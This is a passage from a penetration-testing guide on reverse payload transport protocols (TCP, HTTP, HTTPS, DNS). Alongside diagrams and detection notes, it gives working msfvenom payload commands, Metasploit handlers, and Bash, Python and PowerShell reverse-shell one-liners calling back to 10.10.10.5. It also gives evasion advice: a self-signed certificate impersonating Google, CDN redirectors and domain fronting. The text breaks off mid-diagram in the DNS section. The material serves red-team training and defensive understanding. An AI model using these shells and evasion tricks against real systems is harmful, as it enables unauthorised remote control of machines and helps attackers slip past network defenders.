---
title: Reverse Payload Protocols — TCP, HTTP, HTTPS, DNS & Beyond
description: Reverse payload protocol , how Reverse TCP, Reverse HTTP, Reverse HTTPS, Reverse DNS, and exotic channels work under the hood. Simple diagrams, packet-level explanations, detection signatures, and when to use each protocol on real engagements.
navigation:
  icon: i-lucide-route
  title: Reverse Payload Protocols
---

Every reverse shell needs a **protocol** to carry it. That protocol determines whether your shell survives firewalls, evades detection, stays encrypted, or dies before the first command executes.

Choosing the wrong protocol is like shouting secrets across a crowded room. Choosing the right one is like whispering through an encrypted tunnel that nobody even knows exists.

This guide breaks down every reverse payload protocol — how it works, what it looks like on the wire, when to use it, and when it will get you caught.

::note
This guide focuses on the **transport protocol** used by reverse payloads — not the payload itself. The same Meterpreter payload can travel over TCP, HTTP, HTTPS, or DNS. The protocol choice affects stealth, reliability, and speed.
::

## The Big Picture

Before diving into individual protocols, understand how they fit together.

```text [Protocol Stack — Reverse Payload]
┌─────────────────────────────────────────────────┐
│              YOUR PAYLOAD                       │
│  (Meterpreter, raw shell, beacon, agent, etc.)  │
├─────────────────────────────────────────────────┤
│           TRANSPORT PROTOCOL                    │
│  (TCP, HTTP, HTTPS, DNS, ICMP, etc.)            │
│                                                 │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Raw TCP  │ │  HTTP/S  │ │   DNS    │  ...   │
│  │ Port Any │ │ Port 80/ │ │ Port 53  │        │
│  │          │ │ 443      │ │          │        │
│  └──────────┘ └──────────┘ └──────────┘        │
├─────────────────────────────────────────────────┤
│           NETWORK LAYER                         │
│  (IP routing, NAT traversal, firewall rules)    │
└─────────────────────────────────────────────────┘
```

::card-group
  ::card
  ---
  title: Reverse TCP
  icon: i-lucide-cable
  ---
  Raw TCP socket connection. Fastest. Simplest. No overhead. But zero stealth — looks like exactly what it is.
  ::

  ::card
  ---
  title: Reverse HTTP
  icon: i-lucide-globe
  ---
  Payload traffic disguised as HTTP web requests. Passes through web proxies. Moderate stealth. Unencrypted.
  ::

  ::card
  ---
  title: Reverse HTTPS
  icon: i-lucide-lock
  ---
  Encrypted HTTP channel. Blends with normal web browsing. High stealth. The gold standard for real engagements.
  ::

  ::card
  ---
  title: Reverse DNS
  icon: i-lucide-at-sign
  ---
  Data tunneled through DNS queries. Extremely slow but nearly impossible to block — every network needs DNS.
  ::
::

## Protocol Comparison Matrix

| Feature | Reverse TCP | Reverse HTTP | Reverse HTTPS | Reverse DNS |
| ------- | ----------- | ------------ | ------------- | ----------- |
| **Default Port** | Any (4444 common) | 80 / 8080 | 443 | 53 |
| **Encryption** | :icon{name="i-lucide-x"} None | :icon{name="i-lucide-x"} None | :icon{name="i-lucide-check"} TLS/SSL | :icon{name="i-lucide-x"} None (can layer) |
| **Speed** | :icon{name="i-lucide-zap"} Fastest | :icon{name="i-lucide-gauge"} Fast | :icon{name="i-lucide-gauge"} Fast | :icon{name="i-lucide-snail"} Very Slow |
| **Stealth** | :icon{name="i-lucide-eye"} Low | :icon{name="i-lucide-eye-off"} Medium | :icon{name="i-lucide-shield-check"} High | :icon{name="i-lucide-shield-check"} High |
| **Proxy Traversal** | :icon{name="i-lucide-x"} No | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes | :icon{name="i-lucide-check"} Yes |
| **Firewall Bypass** | Low | High | Very High | Extremely High |
| **IDS Detection** | Easy to detect | Moderate | Hard (encrypted) | Hard (looks like DNS) |
| **Reliability** | High (persistent conn) | Medium (polling) | Medium (polling) | Low (UDP, packet loss) |
| **Connection Type** | Persistent socket | HTTP polling | HTTPS polling | DNS query/response |
| **Data Capacity** | Unlimited | High | High | Very Low (~200 bytes/query) |
| **Best For** | Labs, CTFs, internal | Proxy environments | Real engagements | Last resort, exfiltration |

## Reverse TCP

### How It Works

Reverse TCP is the simplest reverse payload protocol. It creates a raw TCP socket connection from the target back to the attacker. No frills. No disguise. Just a direct pipe.

```text [Reverse TCP — Connection Flow]

  ATTACKER (Listener)                         TARGET (Payload)
  ┌─────────────────┐                         ┌─────────────────┐
  │                 │                         │                 │
  │  nc -lvnp 4444  │                         │  Payload        │
  │                 │                         │  executes       │
  │  Waiting...     │                         │                 │
  │                 │    ① SYN               │                 │
  │                 │◄────────────────────────│  TCP Connect    │
  │                 │    ② SYN-ACK           │  to attacker    │
  │                 │────────────────────────▶│  IP:4444        │
  │                 │    ③ ACK               │                 │
  │                 │◄────────────────────────│                 │
  │                 │                         │                 │
  │  ════════════ TCP CONNECTION ESTABLISHED ══════════════     │
  │                 │                         │                 │
  │  $ whoami       │────── DATA ───────────▶│  Executes cmd   │
  │                 │                         │                 │
  │  root           │◄───── DATA ────────────│  Returns output │
  │                 │                         │                 │
  │  $ id           │────── DATA ───────────▶│  Executes cmd   │
  │                 │                         │                 │
  │  uid=0(root)    │◄───── DATA ────────────│  Returns output │
  │                 │                         │                 │
  │  ═══════════ PERSISTENT CONNECTION ═══════════════════     │
  │  (stays open until one side disconnects)                   │
  │                 │                         │                 │
  └─────────────────┘                         └─────────────────┘
```

### What It Looks Like on the Wire

```text [Packet Capture — Reverse TCP]

  No.  Time      Source          Dest            Protocol  Info
  ───  ────      ──────          ────            ────────  ────
  1    0.000     192.168.1.100   10.10.10.5      TCP       49152 → 4444 [SYN]
  2    0.001     10.10.10.5      192.168.1.100   TCP       4444 → 49152 [SYN,ACK]
  3    0.002     192.168.1.100   10.10.10.5      TCP       49152 → 4444 [ACK]
  4    0.050     10.10.10.5      192.168.1.100   TCP       "whoami\n"
  5    0.055     192.168.1.100   10.10.10.5      TCP       "root\n"
  6    0.100     10.10.10.5      192.168.1.100   TCP       "id\n"
  7    0.108     192.168.1.100   10.10.10.5      TCP       "uid=0(root)...\n"

  ⚠️  ALL DATA IS PLAINTEXT — readable by anyone sniffing the network
  ⚠️  Port 4444 is flagged by every IDS on the planet
  ⚠️  Continuous TCP connection is suspicious on network monitoring
```

### Firewall Perspective

```text [Firewall — Reverse TCP]

  TARGET MACHINE FIREWALL
  ┌──────────────────────────────────────────────────┐
  │                                                  │
  │  INBOUND RULES         OUTBOUND RULES            │
  │  ┌────────────────┐    ┌────────────────────┐    │
  │  │ 22  → ALLOW    │    │ 80  → ALLOW        │    │
  │  │ 80  → ALLOW    │    │ 443 → ALLOW        │    │
  │  │ 443 → ALLOW    │    │ 53  → ALLOW        │    │
  │  │ *   → DENY     │    │ 4444 → ???         │    │
  │  └────────────────┘    │                    │    │
  │                        │ If ALLOW ALL OUT:  │    │
  │                        │   ✅ Shell works   │    │
  │                        │                    │    │
  │                        │ If DENY by default:│    │
  │                        │   ❌ Shell blocked │    │
  │                        └────────────────────┘    │
  │                                                  │
  └──────────────────────────────────────────────────┘

  MOST home/small networks: ALLOW ALL OUTBOUND → Shell works
  MOST enterprise networks: Outbound restricted → Shell likely blocked on port 4444
```

### Usage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Payload Generation"}
  ```bash [Staged (Requires Metasploit Listener)]
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.10.5 LPORT=4444 \
    -f exe -o reverse_tcp_staged.exe
  ```

  ```bash [Stageless (Works with Any Listener)]
  msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.10.5 LPORT=4444 \
    -f exe -o reverse_tcp_stageless.exe
  ```

  ```bash [Linux ELF]
  msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=10.10.10.5 LPORT=4444 \
    -f elf -o reverse_tcp.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Listeners"}
  ```bash [Netcat]
  nc -lvnp 4444
  ```

  ```bash [Metasploit]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="One-Liner Shells"}
  ```bash [Bash]
  bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
  ```

  ```python [Python]
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```powershell [PowerShell]
  powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()"
  ```
  :::
::

### Pros & Cons

::field-group
  ::field{name="Fastest protocol" type="pro"}
  No HTTP headers, no encoding overhead, no polling delays. Raw data flows at wire speed. Interactive commands feel instant.
  ::

  ::field{name="Simplest to set up" type="pro"}
  One-liner payload + Netcat listener. Nothing to configure. Works in 10 seconds.
  ::

  ::field{name="Most reliable connection" type="pro"}
  Persistent TCP socket stays open. No reconnection logic needed. Data delivery is guaranteed by TCP.
  ::

  ::field{name="Works with any listener" type="pro"}
  Netcat, Ncat, Socat, Metasploit — stageless TCP shells work with any tool that can handle a TCP connection.
  ::

  ::field{name="Zero encryption" type="con"}
  All commands and output are plaintext. Anyone sniffing the network sees everything — commands, credentials, data.
  ::

  ::field{name="Easily detected" type="con"}
  Port 4444 is flagged universally. Continuous non-standard TCP connections trigger alerts. Pattern matching catches common shell signatures.
  ::

  ::field{name="Blocked by egress firewalls" type="con"}
  Enterprise firewalls only allow outbound traffic on 80, 443, and 53. A connection to port 4444 is immediately dropped.
  ::

  ::field{name="Cannot traverse HTTP proxies" type="con"}
  Many corporate networks force all traffic through an HTTP proxy. Raw TCP connections cannot pass through HTTP proxies.
  ::
::

::tip
**When to use Reverse TCP:** Labs, CTFs, Hack The Box, internal networks with no egress filtering, or any environment where stealth does not matter and speed does. Use port 443 instead of 4444 if you want minimal improvement against port-based filtering.
::

---

## Reverse HTTP

### How It Works

Reverse HTTP wraps payload communication inside standard HTTP requests and responses. The target sends HTTP GET/POST requests to the attacker's HTTP server. Commands travel as HTTP responses. Output travels as HTTP request bodies.

The key difference from Reverse TCP is that this is a **polling-based** protocol. The target periodically asks _"Do you have a command for me?"_ instead of maintaining a persistent connection.

```text [Reverse HTTP — Connection Flow]

  ATTACKER (HTTP Server)                      TARGET (HTTP Client)
  ┌─────────────────┐                         ┌─────────────────┐
  │                 │                         │                 │
  │  HTTP Listener  │                         │  Payload        │
  │  Port 80        │                         │  executes       │
  │                 │                         │                 │
  │                 │  ① GET /news?id=a3f8    │                 │
  │                 │◄────────────────────────│  "Any commands  │
  │                 │  (Check-in request)     │   for me?"      │
  │                 │                         │                 │
  │  "Run whoami"   │  ② 200 OK              │                 │
  │                 │────────────────────────▶│  Receives task  │
  │                 │  (Command in response)  │                 │
  │                 │                         │  Executes...    │
  │                 │                         │                 │
  │                 │  ③ POST /submit         │                 │
  │  "root"         │◄────────────────────────│  Sends output   │
  │                 │  (Output in POST body)  │  back as POST   │
  │                 │                         │                 │
  │                 │  ④ 200 OK              │                 │
  │                 │────────────────────────▶│  Acknowledged   │
  │                 │                         │                 │
  │     ┌─── 5 second pause (polling interval) ───┐            │
  │                 │                         │                 │
  │                 │  ⑤ GET /news?id=b7c2    │                 │
  │                 │◄────────────────────────│  "Any more      │
  │                 │                         │   commands?"    │
  │                 │                         │                 │
  │  "No tasks"     │  ⑥ 200 OK (empty)      │                 │
  │                 │────────────────────────▶│  Sleeps...      │
  │                 │                         │                 │
  │     ┌─── 5 second pause ───┐                               │
  │                 │                         │                 │
  │                 │  (cycle repeats)        │                 │
  └─────────────────┘                         └─────────────────┘
```

### What It Looks Like on the Wire

```text [Packet Capture — Reverse HTTP]

  No.  Time      Source          Dest            Protocol  Info
  ───  ────      ──────          ────            ────────  ────
  1    0.000     192.168.1.100   10.10.10.5      TCP       49200 → 80 [SYN]
  2    0.001     10.10.10.5      192.168.1.100   TCP       80 → 49200 [SYN,ACK]
  3    0.002     192.168.1.100   10.10.10.5      TCP       [ACK]
  4    0.003     192.168.1.100   10.10.10.5      HTTP      GET /news?id=a3f8e2 HTTP/1.1
  5    0.050     10.10.10.5      192.168.1.100   HTTP      HTTP/1.1 200 OK [command data]
  6    0.100     192.168.1.100   10.10.10.5      TCP       [ACK]
  7    0.200     192.168.1.100   10.10.10.5      HTTP      POST /submit HTTP/1.1 [output]
  8    0.250     10.10.10.5      192.168.1.100   HTTP      HTTP/1.1 200 OK
  9    5.000     192.168.1.100   10.10.10.5      TCP       49201 → 80 [SYN]
  10   5.003     192.168.1.100   10.10.10.5      HTTP      GET /news?id=b7c299 HTTP/1.1
  ...

  ⚠️  Traffic is PLAINTEXT HTTP — readable by proxies, IDS, anyone sniffing
  ⚠️  Looks like web browsing but patterns are detectable
  ⚠️  Polling interval creates a regular, predictable traffic pattern
  ✅  Port 80 is almost always allowed outbound
  ✅  Can traverse HTTP proxies
```

### HTTP Request Structure

::tabs
  :::tabs-item{icon="i-lucide-arrow-up" label="Check-in (Target → Attacker)"}
  ```http [GET Request — Beacon Check-in]
  GET /news/article?id=a3f8e2b1&ref=homepage HTTP/1.1
  Host: legitimate-looking-domain.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  Accept: text/html,application/xhtml+xml
  Accept-Language: en-US,en;q=0.9
  Connection: close
  Cookie: session=BASE64_ENCODED_METADATA

  ← Looks like a normal web request
  ← But the Cookie/URL contains encoded session info
  ← The attacker's server knows this is a payload checking in
  ```
  :::

  :::tabs-item{icon="i-lucide-arrow-down" label="Task (Attacker → Target)"}
  ```http [Response — Command Delivery]
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=UTF-8
  Content-Length: 1247
  Server: Apache/2.4.41
  Connection: close

  <html><body>
  <!-- Normal looking HTML but embedded data contains the command -->
  <!-- Data can be hidden in comments, headers, or encoded in the body -->
  ENCODED_COMMAND_DATA_HERE
  </body></html>

  ← Response looks like a normal web page
  ← Command data is encoded/hidden within the response
  ← IDS must deep-inspect to find the payload
  ```
  :::

  :::tabs-item{icon="i-lucide-arrow-up" label="Output (Target → Attacker)"}
  ```http [POST Request — Command Output]
  POST /api/analytics/submit HTTP/1.1
  Host: legitimate-looking-domain.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 892

  data=BASE64_ENCODED_COMMAND_OUTPUT

  ← Looks like analytics data being submitted
  ← Actual command output is encoded in the POST body
  ← Blends with normal web application traffic
  ```
  :::
::

### Firewall Perspective

```text [Firewall — Reverse HTTP]

  TARGET MACHINE FIREWALL
  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  OUTBOUND RULES                                      │
  │  ┌──────────────────────────────────────┐            │
  │  │ Port 80 (HTTP)   → ALLOW ✅          │            │
  │  │ Port 443 (HTTPS) → ALLOW            │            │
  │  │ Port 53 (DNS)    → ALLOW            │            │
  │  │ Port 4444        → DENY ❌           │            │
  │  │ All other        → DENY             │            │
  │  └──────────────────────────────────────┘            │
  │                                                      │
  │  Reverse TCP on 4444?   ❌ BLOCKED                   │
  │  Reverse HTTP on 80?    ✅ ALLOWED                   │
  │                                                      │
  │  HTTP PROXY (if present)                             │
  │  ┌──────────────────────────────────────┐            │
  │  │ All HTTP traffic forced through      │            │
  │  │ proxy at 10.0.0.1:8080               │            │
  │  │                                      │            │
  │  │ Reverse TCP?  ❌ Cannot traverse     │            │
  │  │ Reverse HTTP? ✅ Passes through      │            │
  │  └──────────────────────────────────────┘            │
  │                                                      │
  └──────────────────────────────────────────────────────┘
```

### Usage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Payload Generation"}
  ```bash [Staged Meterpreter (HTTP)]
  msfvenom -p windows/x64/meterpreter/reverse_http \
    LHOST=10.10.10.5 LPORT=80 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -f exe -o reverse_http.exe
  ```

  ```bash [Stageless Meterpreter (HTTP)]
  msfvenom -p windows/x64/meterpreter_reverse_http \
    LHOST=10.10.10.5 LPORT=80 \
    -f exe -o reverse_http_stageless.exe
  ```

  ```bash [Linux (HTTP)]
  msfvenom -p linux/x64/meterpreter/reverse_http \
    LHOST=10.10.10.5 LPORT=80 \
    -f elf -o reverse_http.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Listener"}
  ```bash [Metasploit Handler]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_http
  set LHOST 0.0.0.0
  set LPORT 80
  set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  set ExitOnSession false
  exploit -j
  ```

  ::warning
  Reverse HTTP **requires** Metasploit's `multi/handler` or a compatible C2 framework. A plain Netcat listener **will not work** because it does not speak HTTP protocol.
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Through Proxy"}
  ```bash [Payload with Proxy Support]
  msfvenom -p windows/x64/meterpreter/reverse_http \
    LHOST=10.10.10.5 LPORT=80 \
    HttpProxyHost=10.0.0.1 \
    HttpProxyPort=8080 \
    HttpProxyUser=proxyuser \
    HttpProxyPass=proxypass \
    -f exe -o reverse_http_proxy.exe
  ```
  :::
::

### Pros & Cons

::field-group
  ::field{name="Bypasses port-based firewalls" type="pro"}
  Port 80 is allowed outbound on virtually every network. The traffic looks like normal web browsing at the port level.
  ::

  ::field{name="Traverses HTTP proxies" type="pro"}
  Unlike raw TCP, HTTP traffic can pass through corporate HTTP proxies that inspect and forward web requests.
  ::

  ::field{name="Harder to detect than raw TCP" type="pro"}
  Traffic resembles legitimate HTTP browsing. Requires content inspection rather than simple port/protocol matching.
  ::

  ::field{name="Connection resilience" type="pro"}
  Polling-based model means lost packets do not kill the session. The target just polls again on the next interval.
  ::

  ::field{name="No encryption" type="con"}
  All traffic is plaintext HTTP. Proxies, IDS, and network taps can read every command and every byte of output.
  ::

  ::field{name="Detectable patterns" type="con"}
  Regular polling interval creates a recognizable beaconing pattern. Smart IDS tools flag periodic HTTP requests to unusual domains.
  ::

  ::field{name="Slower than TCP" type="con"}
  HTTP headers add overhead. Polling introduces latency. Interactive commands feel sluggish compared to raw TCP.
  ::

  ::field{name="SSL inspection breaks it" type="con"}
  Corporate networks with SSL inspection / SSL bump proxies can read the HTTP traffic despite the connection looking normal.
  ::
::

---

## Reverse HTTPS

### How It Works

Reverse HTTPS is identical to Reverse HTTP but wrapped in TLS/SSL encryption. The target makes HTTPS requests to the attacker's server. All data — commands, output, metadata — is encrypted end-to-end.

This is the **gold standard** for real-world engagements and red team operations.

```text [Reverse HTTPS — Connection Flow]

  ATTACKER (HTTPS Server)                     TARGET (HTTPS Client)
  ┌─────────────────┐                         ┌─────────────────┐
  │                 │                         │                 │
  │  HTTPS Listener │                         │  Payload        │
  │  Port 443       │                         │  executes       │
  │                 │                         │                 │
  │                 │  ① TCP SYN → 443       │                 │
  │                 │◄────────────────────────│                 │
  │                 │  ② SYN-ACK            │                 │
  │                 │────────────────────────▶│                 │
  │                 │  ③ ACK                │                 │
  │                 │◄────────────────────────│                 │
  │                 │                         │                 │
  │                 │  ④ TLS ClientHello     │                 │
  │                 │◄────────────────────────│  TLS Handshake  │
  │                 │  ⑤ TLS ServerHello     │  begins          │
  │                 │────────────────────────▶│                 │
  │                 │  ⑥ Certificate         │                 │
  │                 │────────────────────────▶│                 │
  │                 │  ⑦ Key Exchange        │                 │
  │                 │◄───────────────────────▶│                 │
  │                 │  ⑧ Finished            │                 │
  │                 │◄───────────────────────▶│                 │
  │                 │                         │                 │
  │  ══════════ TLS TUNNEL ESTABLISHED ══════════════════      │
  │  │           ALL DATA NOW ENCRYPTED          │             │
  │                 │                         │                 │
  │                 │  ⑨ 🔒 GET /page       │                 │
  │                 │◄────────────────────────│  Check-in       │
  │                 │  (Encrypted check-in)  │  (encrypted)    │
  │                 │                         │                 │
  │  "Run whoami"   │  ⑩ 🔒 200 OK          │                 │
  │  (encrypted)    │────────────────────────▶│  Receives task  │
  │                 │                         │  (encrypted)    │
  │                 │                         │                 │
  │                 │  ⑪ 🔒 POST /data      │                 │
  │  "root"         │◄────────────────────────│  Sends output   │
  │  (encrypted)    │                         │  (encrypted)    │
  │                 │                         │                 │
  │  🔒 ═══════ ENCRYPTED POLLING CONTINUES ═══════ 🔒        │
  │                 │                         │                 │
  └─────────────────┘                         └─────────────────┘

  🔒 = Nobody between attacker and target can read the traffic
       Not the firewall, not the IDS, not the proxy, nobody.
```

### What It Looks Like on the Wire

```text [Packet Capture — Reverse HTTPS]

  No.  Time      Source          Dest            Protocol  Info
  ───  ────      ──────          ────            ────────  ────
  1    0.000     192.168.1.100   10.10.10.5      TCP       49300 → 443 [SYN]
  2    0.001     10.10.10.5      192.168.1.100   TCP       443 → 49300 [SYN,ACK]
  3    0.002     192.168.1.100   10.10.10.5      TCP       [ACK]
  4    0.003     192.168.1.100   10.10.10.5      TLSv1.3   Client Hello
  5    0.010     10.10.10.5      192.168.1.100   TLSv1.3   Server Hello, Certificate
  6    0.020     192.168.1.100   10.10.10.5      TLSv1.3   Key Exchange, Finished
  7    0.025     10.10.10.5      192.168.1.100   TLSv1.3   Finished
  8    0.030     192.168.1.100   10.10.10.5      TLSv1.3   Application Data (encrypted)
  9    0.080     10.10.10.5      192.168.1.100   TLSv1.3   Application Data (encrypted)
  10   0.130     192.168.1.100   10.10.10.5      TLSv1.3   Application Data (encrypted)
  11   5.000     192.168.1.100   10.10.10.5      TLSv1.3   Application Data (encrypted)
  ...

  ✅  Port 443 — standard HTTPS, almost never blocked
  ✅  Traffic is ENCRYPTED — IDS cannot read the content
  ✅  Looks identical to normal web browsing
  ⚠️  TLS metadata (SNI, certificate) can still be inspected
  ⚠️  SSL inspection proxies can break the encryption (corporate environments)
```

### Firewall & Proxy Perspective

```text [Firewall — Reverse HTTPS]

  ┌───────────────────────────────────────────────────────────┐
  │  TARGET NETWORK                                           │
  │                                                           │
  │  Scenario A: Simple Firewall (No SSL Inspection)          │
  │  ┌────────────────────────────────────┐                   │
  │  │  Port 443 outbound → ALLOW ✅      │                   │
  │  │  HTTPS traffic passes through      │                   │
  │  │  Firewall sees ENCRYPTED bytes     │                   │
  │  │  Cannot inspect content            │                   │
  │  │                                    │                   │
  │  │  Result: SHELL WORKS ✅            │                   │
  │  └────────────────────────────────────┘                   │
  │                                                           │
  │  Scenario B: SSL Inspection Proxy (Corporate)             │
  │  ┌────────────────────────────────────┐                   │
  │  │  Proxy terminates TLS connection   │                   │
  │  │  Decrypts → Inspects → Re-encrypts│                   │
  │  │  Proxy sees the HTTP content!      │                   │
  │  │                                    │                   │
  │  │  If payload detected:              │                   │
  │  │  Result: SHELL BLOCKED ❌          │                   │
  │  │                                    │                   │
  │  │  If payload looks normal:          │                   │
  │  │  Result: SHELL WORKS ✅            │                   │
  │  │  (depends on inspection depth)     │                   │
  │  └────────────────────────────────────┘                   │
  │                                                           │
  │  Scenario C: Certificate Pinning Check                    │
  │  ┌────────────────────────────────────┐                   │
  │  │  Network checks TLS certificate   │                   │
  │  │  Self-signed cert → FLAGGED ⚠️    │                   │
  │  │  Let's Encrypt cert → ALLOWED ✅  │                   │
  │  │                                    │                   │
  │  │  Use a real domain with a real     │                   │
  │  │  certificate for best results     │                   │
  │  └────────────────────────────────────┘                   │
  │                                                           │
  └───────────────────────────────────────────────────────────┘
```

### Usage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Payload Generation"}
  ```bash [Staged Meterpreter (HTTPS)]
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.10.5 LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    -f exe -o reverse_https.exe
  ```

  ```bash [Stageless Meterpreter (HTTPS)]
  msfvenom -p windows/x64/meterpreter_reverse_https \
    LHOST=10.10.10.5 LPORT=443 \
    -f exe -o reverse_https_stageless.exe
  ```

  ```bash [Linux (HTTPS)]
  msfvenom -p linux/x64/meterpreter/reverse_https \
    LHOST=10.10.10.5 LPORT=443 \
    -f elf -o reverse_https.elf
  ```

  ```bash [With Custom Certificate]
  # Generate certificate
  openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=CA/L=SF/O=Google LLC/CN=www.google.com" \
    -keyout server.key -out server.crt
  cat server.key server.crt > server.pem

  # Use in payload
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.10.5 LPORT=443 \
    HandlerSSLCert=server.pem \
    StagerVerifySSLCert=true \
    -f exe -o reverse_https_cert.exe
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Listener"}
  ```bash [Metasploit Handler]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 443
  set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  set HandlerSSLCert /path/to/server.pem
  set StagerVerifySSLCert true
  set ExitOnSession false
  exploit -j
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Advanced Options"}
  ```bash [Jitter & Sleep (Anti-Pattern Detection)]
  # In the handler
  set SessionCommunicationTimeout 0
  set SessionExpirationTimeout 0

  # In the payload (Meterpreter)
  meterpreter > transport list
  meterpreter > transport set-timeouts -cs 30 -ct 0 -ce 0
  # -cs = comm seconds (sleep between callbacks)
  # Adding jitter makes the interval random
  ```
  :::
::

### HTTPS vs HTTP — Side by Side

```text [Network Visibility Comparison]

  ┌─────────────────────────────────────────────────────────────────┐
  │  WHAT THE NETWORK ADMIN / IDS SEES                             │
  │                                                                 │
  │  Reverse HTTP:                                                  │
  │  ┌───────────────────────────────────────────────────────┐     │
  │  │ GET /news?id=a3f8 HTTP/1.1                           │     │
  │  │ Host: suspicious-domain.com                           │     │
  │  │ Cookie: session=SGVsbG8gV29ybGQ=                     │     │
  │  │                                                       │     │
  │  │ Response: <html>ENCODED_COMMAND_HERE</html>           │     │
  │  │                                                       │     │
  │  │ 👁️ FULLY VISIBLE — every byte readable               │     │
  │  └───────────────────────────────────────────────────────┘     │
  │                                                                 │
  │  Reverse HTTPS:                                                 │
  │  ┌───────────────────────────────────────────────────────┐     │
  │  │ TLS Client Hello → SNI: suspicious-domain.com        │     │
  │  │ TLS Server Hello ← Certificate info                  │     │
  │  │ Application Data: 7a 2f 8b 3c e1 9d 4f 2a ...      │     │
  │  │ Application Data: b3 71 c8 5e 9a 0d 6f 1b ...      │     │
  │  │ Application Data: f2 44 a7 89 3d 6c e5 08 ...      │     │
  │  │                                                       │     │
  │  │ 🔒 ENCRYPTED — only metadata visible                 │     │
  │  │    Can see: destination IP, port, cert info, timing  │     │
  │  │    Cannot see: URLs, headers, commands, output       │     │
  │  └───────────────────────────────────────────────────────┘     │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
```

### Pros & Cons

::field-group
  ::field{name="End-to-end encryption" type="pro"}
  All traffic is encrypted with TLS. Network monitors, IDS, and firewalls cannot read the content without SSL inspection.
  ::

  ::field{name="Blends with normal traffic" type="pro"}
  Port 443, TLS handshake, HTTP semantics — indistinguishable from browsing Google at the network level.
  ::

  ::field{name="Bypasses almost all firewalls" type="pro"}
  Port 443 is allowed on virtually every network. Even the most restrictive environments allow HTTPS outbound.
  ::

  ::field{name="Proxy traversal" type="pro"}
  HTTPS traffic passes through HTTP proxies via the `CONNECT` method. Most proxies forward HTTPS without inspection.
  ::

  ::field{name="Certificate pinning option" type="pro"}
  Using `StagerVerifySSLCert` ensures the payload only connects to YOUR server, preventing interception and analysis.
  ::

  ::field{name="Polling latency" type="con"}
  Same as HTTP — polling-based means commands are not instant. Sleep interval adds delay between check-ins.
  ::

  ::field{name="SSL inspection defeats it" type="con"}
  Corporate environments with SSL bump proxies (Palo Alto, Zscaler, Symantec) can decrypt, inspect, and re-encrypt the traffic.
  ::

  ::field{name="Certificate metadata visible" type="con"}
  Even with encryption, the TLS handshake exposes: SNI (Server Name Indication), certificate issuer, certificate subject. A self-signed cert to a random domain is suspicious.
  ::

  ::field{name="Requires Metasploit or C2 framework" type="con"}
  Cannot use a simple Netcat listener. Needs a proper HTTP/HTTPS handler that speaks the protocol.
  ::
::

::tip
**Pro tip for real engagements:** Register a legitimate-looking domain, get a Let's Encrypt certificate, and set up the HTTPS listener behind a CDN like Cloudflare. The traffic will appear as normal HTTPS requests to a known CDN IP address. This is called **domain fronting** (where supported) or **redirector infrastructure**.
::

---

## Reverse DNS

### How It Works

Reverse DNS tunnels payload data inside DNS queries and responses. Instead of sending data over TCP/HTTP, the target encodes data into DNS subdomain queries. The attacker's authoritative DNS server decodes the data and sends commands back as DNS responses.

DNS is the **last resort** protocol — slow and low bandwidth, but nearly impossible to block because every network needs DNS to function.

```text [Reverse DNS — Connection Flow]

  ATTACKER                     DNS                        TARGET
  (Authoritative DNS           Infrastructure             (Payload)
   for evil.com)
  ┌─────────────┐             ┌──────────┐              ┌─────────────┐
  │             │             │          │              │             │
  │  DNS C2     │             │  Public  │              │  Payload    │
  │  Server     │             │  DNS     │              │  executes   │
  │             │             │  Resolver│              │             │
  │             │             │          │              │             │
  │             │             │          │  ① DNS Query │             │
  │             │             │          │◄─────────────│  Encodes    │
  │             │             │          │              │  check-in   │
  │             │             │          │              │  data as    │
  │             │  ② Forward │          │              │  subdomain  │
  │             │◄────────────│          │              │             │
  │             │  (Recursive │          │              │             │
  │             │   lookup)   │          │              │             │
  │             │             │          │              │             │
  │  Decode     │  ③ Response │          │              │             │
